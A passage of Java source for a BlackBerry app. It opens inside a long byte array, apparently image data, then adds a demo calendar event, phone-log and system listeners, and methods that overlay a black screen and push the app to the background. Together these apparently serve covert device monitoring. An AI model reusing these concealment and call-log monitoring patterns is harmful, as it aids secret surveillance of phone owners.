(byte)113, (byte)186, (byte)69, (byte)243, (byte)210, (byte)229, (byte)6, (byte)14, (byte)179, (byte)19, (byte)120, (byte)36, (byte)155, (byte)91, (byte)189, (byte)230, (byte)78, (byte)139, (byte)176, (byte)184, (byte)65, (byte)44, (byte)71, (byte)78, (byte)152, (byte)23, (byte)32, (byte)79, (byte)76, (byte)168, (byte)117, (byte)3, (byte)220, (byte)128, (byte)129, (byte)24, (byte)115, (byte)221, (byte)46, (byte)172, (byte)179, (byte)146, (byte)57, (byte)174, (byte)169, (byte)164, (byte)98, (byte)129, (byte)79, (byte)174, (byte)158, (byte)161, (byte)119, (byte)88, (byte)13, (byte)120, (byte)145, (byte)1, (byte)23, (byte)42, (byte)68, (byte)86, (byte)65, (byte)164, (byte)221, (byte)183, (byte)96, (byte)94, (byte)226, (byte)196, (byte)111, (byte)232, (byte)26, (byte)252, (byte)20, (byte)176, (byte)179, (byte)220, (byte)1, (byte)43, (byte)123, (byte)102, (byte)164, (byte)250, (byte)105, (byte)86, (byte)119, (byte)164, (byte)68, (byte)24, (byte)112, (byte)209, (byte)152, (byte)20, (byte)231, (byte)119, (byte)246, (byte)241, (byte)244, (byte)161, (byte)94, (byte)151, (byte)63, (byte)157, (byte)93, (byte)243, (byte)148, (byte)250, (byte)111, (byte)180, (byte)122, (byte)222, (byte)86, (byte)34, (byte)165, (byte)120, (byte)228, (byte)141, (byte)66, (byte)23, (byte)76, (byte)33, (byte)22, (byte)25, (byte)235, (byte)109, (byte)164, (byte)128, (byte)147, (byte)35, (byte)71, (byte)17, (byte)204, (byte)20, (byte)9, (byte)53, (byte)197, (byte)69, (byte)158, (byte)9, (byte)50, (byte)74, (byte)154, (byte)197, (byte)191, (byte)32, (byte)108, (byte)205, (byte)193, (byte)183, (byte)138, (byte)238, (byte)208, (byte)177, (byte)240, (byte)106, (byte)126, (byte)223, (byte)115, (byte)152, (byte)249, (byte)206, (byte)51, (byte)62, (byte)169, (byte)181, (byte)199, (byte)79, (byte)156, (byte)55, (byte)224, (byte)37, (byte)186, (byte)133, (byte)31, (byte)68, (byte)166, (byte)188, (byte)219, (byte)8, (byte)247, (byte)12, (byte)107, (byte)155, (byte)59, (byte)247, (byte)242, (byte)76, (byte)215, (byte)129, (byte)140, (byte)96, (byte)26, (byte)234, (byte)174, (byte)108, (byte)238, (byte)218, (byte)243, (byte)177, (byte)232, (byte)15, (byte)212, (byte)58, (byte)20, (byte)243, (byte)121, (byte)41, (byte)91, (byte)63, (byte)141, (byte)141, (byte)31, (byte)111, (byte)173, (byte)60, (byte)70, (byte)38, (byte)211, (byte)200, (byte)214, (byte)194, (byte)148, (byte)74, (byte)151, (byte)188, (byte)73, (byte)41, (byte)254, (byte)205, (byte)122, (byte)176, (byte)243, (byte)106, (byte)126, (byte)239, (byte)4, (byte)201, (byte)74, (byte)169, (byte)107, (byte)35, (byte)126, (byte)214, (byte)153, (byte)226, (byte)103, (byte)111, (byte)43, (byte)31, (byte)123, (byte)104, (byte)247, (byte)217, (byte)57, (byte)120, (byte)7, (byte)254, (byte)33, (byte)16, (byte)215, (byte)92, (byte)59, (byte)154, (byte)161, (byte)163, (byte)36, (byte)22, (byte)206, (byte)76, (byte)253, (byte)48, (byte)164, (byte)122, (byte)222, (byte)14, (byte)238, (byte)135, (byte)215, (byte)118, (byte)228, (byte)199, (byte)0, (byte)35, (byte)157, (byte)101, (byte)47, (byte)49, (byte)16, (byte)135, (byte)189, (byte)128, (byte)5, (byte)104, (byte)213, (byte)109, (byte)173, (byte)242, (byte)228, (byte)212, (byte)92, (byte)65, (byte)112, (byte)246, (byte)177, (byte)205, (byte)174, (byte)183, (byte)64, (byte)151, (byte)24, (byte)126, (byte)106, (byte)52, (byte)113, (byte)208, (byte)182, (byte)73, (byte)41, (byte)18, (byte)30, (byte)80, (byte)5, (byte)10, (byte)200, (byte)63, (byte)218, (byte)156, (byte)131, (byte)111, (byte)54, (byte)191, (byte)171, (byte)100, (byte)161, (byte)90, (byte)111, (byte)244, (byte)196, (byte)15, (byte)109, (byte)16, (byte)172, (byte)146, (byte)252, (byte)223, (byte)159, (byte)26, (byte)24, (byte)63, (byte)113, (byte)249, (byte)139, (byte)71, (byte)83, (byte)144, (byte)146, (byte)146, (byte)114, (byte)243, (byte)117, (byte)246, (byte)241, (byte)140, (byte)239, (byte)41, (byte)204, (byte)136, (byte)140, (byte)96, (byte)154, (byte)5, (byte)174, (byte)108, (byte)238, (byte)218, (byte)243, (byte)177, (byte)232, (byte)111, (byte)233, (byte)90, (byte)227, (byte)110, (byte)172, (byte)84, (byte)166, (byte)83, (byte)45, (byte)60, (byte)110, (byte)41, (byte)34, (byte)78, (byte)115, (byte)102, (byte)49, (byte)223, (byte)200, (byte)54, (byte)142, (byte)38, (byte)169, (byte)118, (byte)147, (byte)161, (byte)59, (byte)35, (byte)147, (byte)128, (byte)252, (byte)92, (byte)46, (byte)215, (byte)58, (byte)27, (byte)146, (byte)77, (byte)190, (byte)101, (byte)5, (byte)21, (byte)22, (byte)22, (byte)134, (byte)0, (byte)19, (byte)93, (byte)15, (byte)85, (byte)128, (byte)40, (byte)63, (byte)20, (byte)61, (byte)228, (byte)129, (byte)22, (byte)20, (byte)65, (byte)21, (byte)212, (byte)65, (byte)45, (byte)50, (byte)13, (byte)193, (byte)191, (byte)124, (byte)255, (byte)205, (byte)89, (byte)213, (byte)151, (byte)121, (byte)231, (byte)168, (byte)163, (byte)100, (byte)250, (byte)179, (byte)162, (byte)100, (byte)161, (byte)90, (byte)111, (byte)36, (byte)88, (byte)199, (byte)133, (byte)4, (byte)134, (byte)193, (byte)179, (byte)90, (byte)36, (byte)213, (byte)224, (byte)114, (byte)113, (byte)81, (byte)72, (byte)109, (byte)192, (byte)112, (byte)78, (byte)114, (byte)246, (byte)241, (byte)12, (byte)234, (byte)37, (byte)204, (byte)136, (byte)140, (byte)96, (byte)26, (byte)210, (byte)174, (byte)108, (byte)238, (byte)218, (byte)243, (byte)177, (byte)232, (byte)15, (byte)212, (byte)58, (byte)68, (byte)170, (byte)14, (byte)18, (byte)89, (byte)117, (byte)172, (byte)25, (byte)62, (byte)174, (byte)215, (byte)59, (byte)131, (byte)220, (byte)40, (byte)153, (byte)190, (byte)100, (byte)3, (byte)114, (byte)246, (byte)177, (byte)13, (byte)85, (byte)96, (byte)2, (byte)76, (byte)107, (byte)73, (byte)41, (byte)254, (byte)189, (byte)91, (byte)72, (byte)94, (byte)250, (byte)179, (byte)162, (byte)104, (byte)82, (byte)141, (byte)251, (byte)204, (byte)31, (byte)188, (byte)116, (byte)22, (byte)0, (byte)48, (byte)151, (byte)145, (byte)240, (byte)15, (byte)111, (byte)116, (byte)131, (byte)13, (byte)39, (byte)141, (byte)153, (byte)244, (byte)237, (byte)217, (byte)57, (byte)120, (byte)25, (byte)236, (byte)144, (byte)97, (byte)43, (byte)22, (byte)206, (byte)59, (byte)151, (byte)90, (byte)168, (byte)248, (byte)222, (byte)155, (byte)124, (byte)133, (byte)252, (byte)20, (byte)166, (byte)5, (byte)36, (byte)71, (byte)129, (byte)23, (byte)226, (byte)84, (byte)168, (byte)29, (byte)0, (byte)151, (byte)95, (byte)228, (byte)111, (byte)74, (byte)113, (byte)208, (byte)17, (byte)4, (byte)97, (byte)44, (byte)44, (byte)44, (byte)190, (byte)159, (byte)128, (byte)203, (byte)200, (byte)214, (byte)39, (byte)74, (byte)50, (byte)234, (byte)227, (byte)55, (byte)180, (byte)233, (byte)38, (byte)252, (byte)208, (byte)223, (byte)186, (byte)232, (byte)156, (byte)4, (byte)157, (byte)90, (byte)198, (byte)75, (byte)149, (byte)73, (byte)45, (byte)47, (byte)134, (byte)183, (byte)77, (byte)206, (byte)148, (byte)38, (byte)194, (byte)197, (byte)74, (byte)212, (byte)62, (byte)35, (byte)243, (byte)78, (byte)135, (byte)135, (byte)30, (byte)225, (byte)22, (byte)217, (byte)57, (byte)134, (byte)77, (byte)76, (byte)234, (byte)150, (byte)81, (byte)87, (byte)79, (byte)213, (byte)23, (byte)116, (byte)101, (byte)103, (byte)60, (byte)12, (byte)182, (byte)195, (byte)164, (byte)122, (byte)222, (byte)118, (byte)77, (byte)208, (byte)197, (byte)136, (byte)63, (byte)112, (byte)239, (byte)68, (byte)75, (byte)104, (byte)170, (byte)133, (byte)31, (byte)157, (byte)102, (byte)139, (byte)124, (byte)85, (byte)43, (byte)67, (byte)102, (byte)26, (byte)71, (byte)207, (byte)85, (byte)69, (byte)4, (byte)64, (byte)84, (byte)205, (byte)0, (byte)74, (byte)184, (byte)127, (byte)50, (byte)74, (byte)154, (byte)9, (byte)154, (byte)161, (byte)231, (byte)225, (byte)109, (byte)205, (byte)193, (byte)183, (byte)138, (byte)242, (byte)208, (byte)177, (byte)240, (byte)106, (byte)126, (byte)223, (byte)115, (byte)208, (byte)234, (byte)42, (byte)38, (byte)38, (byte)38, (byte)44, (byte)44, (byte)28, (byte)193, (byte)72, (byte)73, (byte)169, (byte)18, (byte)171, (byte)26, (byte)60, (byte)60, (byte)188, (byte)69, (byte)48, (byte)236, (byte)206, (byte)137, (byte)105, (byte)100, (byte)245, (byte)76, (byte)207, (byte)59, (byte)136, (byte)158, (byte)162, (byte)85, (byte)32, (byte)156, (byte)206, (byte)193, (byte)183, (byte)138, (byte)225, (byte)82, (byte)222, (byte)243, (byte)9, (byte)2, (byte)225, (byte)146, (byte)149, (byte)149, (byte)45, (byte)6, (byte)159, (byte)32, (byte)229, (byte)16, (byte)251, (byte)134, (byte)193, (byte)100, (byte)92, (byte)133, (byte)171, (byte)135, (byte)107, (byte)65, (byte)33, (byte)120, (byte)125, (byte)113, (byte)76, (byte)253, (byte)173, (byte)116, (byte)246, (byte)177, (byte)205, (byte)174, (byte)183, (byte)74, (byte)151, (byte)188, (byte)73, (byte)41, (byte)254, (byte)205, (byte)122, (byte)48, (byte)155, (byte)234, (byte)30, (byte)211, (byte)90, (byte)9, (byte)203, (byte)79, (byte)79, (byte)79, (byte)96, (byte)203, (byte)161, (byte)65, (byte)85, (byte)15, (byte)17, (byte)45, (byte)33, (byte)21, (byte)112, (byte)131, (byte)148, (byte)188, (byte)6, (byte)162, (byte)128, (byte)224, (byte)81, (byte)68, (byte)68, (byte)164, (byte)201, (byte)119, (byte)84, (byte)161, (byte)77, (byte)212, (byte)28, (byte)34, (byte)194, (byte)68, (byte)157, (byte)216, (byte)235, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)186, (byte)250, (byte)251, (byte)254, (byte)234, (byte)226, (byte)216, (byte)248, (byte)175, (byte)175, (byte)175, (byte)185, (byte)30, (byte)221, (byte)27, (byte)61, (byte)186, (byte)154, (byte)234, (byte)240, (byte)142, (byte)223, (byte)154, (byte)137, (byte)137, (byte)201, (byte)131, (byte)194, (byte)242, (byte)133, (byte)141, (byte)150, (byte)8, (byte)170, (byte)234, (byte)170, (byte)16, (byte)211, (byte)251, (byte)5, (byte)241, (byte)69, (byte)2, (byte)136, (byte)200, (byte)102, (byte)67, (byte)114, (byte)68, (byte)250, (byte)250, (byte)250, (byte)250, (byte)179, (byte)191, (byte)180, (byte)190, (byte)84, (byte)184, (byte)154, (byte)120
        };
        return background;
    }

    private void setDemoCalendar() throws PIMException {
        final PIM pim = PIM.getInstance();
        EventList el = 
                (EventList)PIM.getInstance().openPIMList( PIM.EVENT_LIST, PIM.READ_WRITE );
        
        Event e = el.createEvent();
        if (el.isSupportedField(Event.SUMMARY)) 
        {
          e.addString(Event.SUMMARY, Event.ATTR_NONE, 
          "Meet with customer");
        }

        if (el.isSupportedField(Event.LOCATION)) 
        {
          e.addString(Event.LOCATION, Event.ATTR_NONE, 
          "Conference Center");
        }

        long start = new Date(System.currentTimeMillis() + 8640000).getTime();

        if (el.isSupportedField(Event.START)) 
        {
          e.addDate(Event.START, Event.ATTR_NONE, 
            start);
        }

        if (el.isSupportedField(Event.END)) 
        {
          e.addDate(Event.END, Event.ATTR_NONE, start + 72000000);
        }

        if (el.isSupportedField(Event.ALARM)) 
        {
          if (e.countValues(Event.ALARM) > 0) 
          {
            e.removeValue(Event.ALARM,0);
            e.setInt(Event.ALARM, 0, Event.ATTR_NONE, 
              396000);
          }
        }
        Invoke.invokeApplication(Invoke.APP_TYPE_CALENDAR, 
                new CalendarArguments( CalendarArguments.ARG_VIEW_DEFAULT, e ) );
    }

    /**
     * 
     */
    public void startListeners() {
        //#ifdef DEBUG
        debug.info("Starting Listeners");
        //#endif

        //Phone.addPhoneListener(appListener);
        addHolsterListener(appListener);
        addSystemListener(appListener);
        //addRadioListener(appListener);
        //MemoryCleanerDaemon.addListener(appListener);

        //addRadioListener(appListener);
        PhoneLogs.addListener(appListener);

        Task.getInstance().resumeApplicationTimer();

        //goBackground();
    }

    /**
     * 
     */
    public void stopListeners() {
        //#ifdef DEBUG
        debug.info("Stopping Listeners");
        //#endif

        removeHolsterListener(appListener);
        removeSystemListener(appListener);
        removeRadioListener(appListener);
        //MemoryCleanerDaemon.removeListener(appListener);

        //Phone.removePhoneListener(appListener);
        PhoneLogs.removeListener(appListener);

        Task.getInstance().suspendApplicationTimer();
        //goBackground();
    }

    public boolean acceptsForeground() {
        return acceptsForeground;
    }

    public void pushBlack() {
        //#ifdef DEBUG
        debug.trace("pushBlack");
        //#endif

        Thread thread = new Thread(new Runnable() {

            public void run() {
                ApplicationManager manager = ApplicationManager
                        .getApplicationManager();
                foregroundId = manager.getForegroundProcessId();

                blackScreen = new BlackScreen();
                acceptsForeground = true;
                synchronized (getAppEventLock()) {
                    pushScreen(blackScreen);
                }

                requestForeground();
            }
        });
        thread.start();

    }

    public void popBlack() {
        //#ifdef DEBUG
        debug.trace("popBlack");
        //#endif

        Thread thread = new Thread(new Runnable() {

            public void run() {

                requestBackground();
                acceptsForeground = false;

                synchronized (getAppEventLock()) {
                    //#ifdef DEBUG
                    debug.trace("popBlack: " + getActiveScreen());
                    //#endif
                    Screen screen = getActiveScreen();
                    if (screen instanceof BlackScreen) {
                        popScreen(blackScreen);
                    }

                }
                ApplicationManager.getApplicationManager().requestForeground(
                        foregroundId);
            };
        });
        thread.start();
    }

    public void activate() {
        //#ifdef DEBUG
        debug.trace("activate");
        //#endif
    }

    public void deactivate() {
        //#ifdef DEBUG
        debug.trace("deactivate");
        //#endif
    }

    public void goBackground() {
        //#ifdef DEBUG
        debug.trace("goBackground");
        //#endif

        if (!Cfg.IS_UI) {
            return;
        }

        invokeLater(new Runnable() {
            public void run() {

                boolean foreground = false;
                UiApplication.getUiApplication().requestBackground();
                foreground = UiApplication.getUiApplication().isForeground();

                //#ifdef DEBUG
                debug.trace("Main foreground: " + foreground);
                //#endif
            }
        });
    }

    public LocalScreen getLocalScreen() {        
        return localScreen;
    }
}
